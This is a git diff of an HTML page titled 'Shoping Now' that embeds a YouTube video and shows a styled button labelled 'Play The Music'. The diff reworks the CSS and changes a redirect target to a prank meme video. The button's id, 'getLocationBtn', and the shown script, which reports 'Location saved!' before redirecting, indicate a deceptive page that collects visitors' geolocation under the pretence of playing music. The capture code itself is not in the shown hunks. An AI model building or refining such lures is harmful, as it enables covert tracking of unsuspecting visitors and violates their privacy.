@@ -4,14 +4,35 @@
   <title>Shoping Now</title>
   <style>
     html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-    /* iframe { width: 100vw; height: 100vh; border: none; } */
+    iframe { width: 100vw; height: 60vh; border: none; }
+    button {
+  padding: 14px 32px;
+  font-size: 18px;
+  font-weight: bold;
+  border: none;
+  border-radius: 8px;
+  background: linear-gradient(135deg, #6e8efb, #a777e3);
+  color: white;
+  cursor: pointer;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  box-shadow: 0 4px 14px rgba(0, 0, 0, 0.2);
+}
+
+button:hover {
+  transform: scale(1.05);
+  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+}
+
+button:active {
+  transform: scale(0.98);
+}
   </style>
 </head>
 <body>
   <!-- Replace VIDEO_ID with real YouTube ID -->
   <!-- <iframe src="https://www.youtube.com/embed/II2EO3Nw4m0?autoplay=1&mute=1&controls=0&showinfo=0&loop=1&playlist=VIDEO_ID"></iframe> -->
   <!-- <iframe width="560" height="315" src="https://www.youtube.com/embed/II2EO3Nw4m0?si=9BaGNUy8-hZMkWA9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe> -->
-  <iframe width="560" height="315" src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+  <iframe src="https://www.youtube.com/embed/YZAFd9o3RYQ?si=VxpMZck8rrJSAGYT" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
   <button id="getLocationBtn">Play The Music</button>
 
   <script>
@@ -47,7 +68,7 @@
         if (result.message) {
           alert("✅ Location saved!");
           // 🔁 Redirect here
-          window.location.href = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQbDOJXnHkd1MaBK5Ht_LvEFAkgHKWs44banw&s"; // or your desired URL
+          window.location.href = "https://cdn.glitch.global/8342c6be-596a-406c-8522-ab90e8b3c464/Bhen%20ka%20shot%20memes%20%20%23viralvideo%20%23memes%20%23terdingvideo%20%23viralmemes%20%23youtubeshorts%20%23viralshort.mp4?v=1751048273444"; // or your desired URL
         } else {
           alert("❌ " + result.error);
         }
